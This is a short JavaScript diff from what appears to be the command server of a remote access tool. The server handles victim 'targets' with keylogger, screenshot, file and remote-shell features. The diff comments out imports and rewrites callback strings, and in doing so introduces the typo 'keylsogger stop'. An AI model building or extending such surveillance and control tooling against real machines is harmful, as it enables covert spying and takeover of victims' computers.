@@ -1,11 +1,11 @@
 import config from '../config'
 // import { logger } from '../logger'
-import { getCurrentTarget, clientList } from './server'
+import { getCurrentTarget } from './server'
 import { disconnectTarget } from '../TargetList'
-import { updateKeyLogger, stopKeyLogger } from '../KeyBoard'
-import { fileNotFound, updateFilepreview, saveFile } from '../File'
-import { shellConnect, updateShellResponse } from '../Shell'
-import { updateScreenShot } from '../ScreenShot'
+// import { updateKeyLogger, stopKeyLogger } from '../KeyBoard'
+// import { fileNotFound, updateFilepreview, saveFile } from '../File'
+import { shellConnect } from '../Shell'
+// import { updateScreenShot } from '../ScreenShot'
 import callback from './callback'
 
 let target = null
@@ -84,9 +84,9 @@ export function handshake () {
   target.write(response)
 }
 
-function getStatus (statusCode) {
-  return config.statusCodes[statusCode.toString()]
-}
+// function getStatus (statusCode) {
+//   return config.statusCodes[statusCode.toString()]
+// }
 
 function getSystemKind (systemKindCode) {
   return config.systemKind[systemKindCode]
@@ -173,16 +173,19 @@ export function processData (data, target) {
           break
         case 204:
           // stopKeyLogger(content)
-          cb('keylogger stop')
+          let ks = 'keylsogger stop'
+          cb(ks)
           break
         case 300:
           // fileNotFound()
-          cb('fileNotFound')
+          let fn = 'fileNotFound'
+          cb(fn)
           break
         case 401:
           disconnectTarget(target)
           // console.log("dis")
-          cb('disconnectTarget')
+          let dis = 'disconnectTarget'
+          cb(dis)
           break
         case 402:
           shellConnect(target, false)
@@ -190,7 +193,8 @@ export function processData (data, target) {
           cb(getCurrentTarget().isShellConnected)
           break
         default:
-          cb('wrong status code')
+          let wc = 'wrong status code'
+          cb(wc)
       }
     } else {
       /* If there's no recorded callback, it is timeout or fake */
